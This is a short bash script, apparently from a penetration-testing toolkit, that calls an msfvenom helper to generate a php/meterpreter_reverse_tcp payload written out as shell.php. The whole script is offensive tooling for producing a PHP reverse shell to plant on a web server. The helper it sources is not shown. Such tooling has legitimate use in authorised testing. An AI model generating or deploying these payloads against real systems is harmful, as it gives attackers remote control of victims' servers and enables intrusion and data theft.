#!/bin/bash

: '
Create PHP file
'

source "${SCRIPTS_DIR}/shell/msfvenom/.files/create_reverse_shell.sh"

payload="php/meterpreter_reverse_tcp"
format="raw"
filename="shell.php"

create_reverse_shell "${payload}" "${format}" "${filename}"